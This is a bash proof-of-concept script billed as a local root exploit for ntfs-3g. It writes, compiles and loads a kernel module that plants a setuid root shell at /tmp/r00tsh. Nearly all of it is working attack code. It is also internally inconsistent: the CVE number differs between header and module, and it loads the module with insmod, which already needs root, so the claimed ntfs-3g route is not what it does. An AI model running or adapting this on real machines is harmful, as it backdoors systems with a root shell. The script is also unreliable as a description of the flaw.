
#!/bin/bash

# CVE-2017-0359 PoC exploit
# Local privilege escalation in ntfs-3g via malicious FUSE module loading 
# Affects: Debian 9/8/7, Ubuntu, Gentoo and others using vulnerable ntfs-3g
# Tested on Debian 9 (Stretch)

# Define key paths 
current_dir="$(pwd)"
kernel_version="$(uname -r)"
lib_modules_dir="${current_dir}/lib/modules"  
fuse_dir="${current_dir}/kernel/fs/fuse"
root_shell_path="/tmp/r00tsh"

# Kernel module source
read -r -d '' module_src << 'EOF'
#include <linux/module.h>

MODULE_LICENSE("CC");  
MODULE_AUTHOR("kristian erik hermansen <kristian.hermansen+CVE-2017-0358@gmail.com>");
MODULE_DESCRIPTION("PoC for CVE-2017-0358 from Google Project Zero");

int init_module(void) {
  printk(KERN_INFO "[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\n");

  // Set environment and arguments to escalate privileges
  char *envp[] = { "HOME=/tmp", NULL };  
  char *argv[] = { "/bin/sh", "-c", "/bin/cp /bin/sh /tmp/r00tsh; /bin/chmod u+s /tmp/r00tsh", NULL };
  
  // Run command to copy shell and set it as setuid root
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

  return 0;  
}

void cleanup_module(void) {
  printk(KERN_INFO "[*] CVE-2017-0358 exploit unloading ...\n");
}
EOF

# Makefile for compiling module  
read -r -d '' makefile << 'EOF'
obj-m += cve_2017_0358.o

all:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:  
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
EOF

echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "@ CVE-2017-0359, PoC by Kristian Erik Hermansen @"
echo "@ ntfs-3g local privilege escalation to root @"  
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

echo "[*] Creating fake kernel module directories..."
mkdir -p "${lib_modules_dir}"
mkdir -p "${fuse_dir}"  

echo "[*] Creating symlinks to current directory..."
ln -sf "${current_dir}" "${lib_modules_dir}/${kernel_version}"
ln -sf "${current_dir}" "${fuse_dir}"  
ln -sf cve_2017_0358.ko fuse.ko

echo "[*] Preparing kernel module..."
echo "${module_src}" > cve_2017_0358.c  
echo "${makefile}" > Makefile

echo "[*] Compiling kernel module..."
make

echo "[*] Loading malicious kernel module..."  
insmod cve_2017_0358.ko

echo "[+] Privilege escalation achieved! Run ${root_shell_path} to get a root shell."
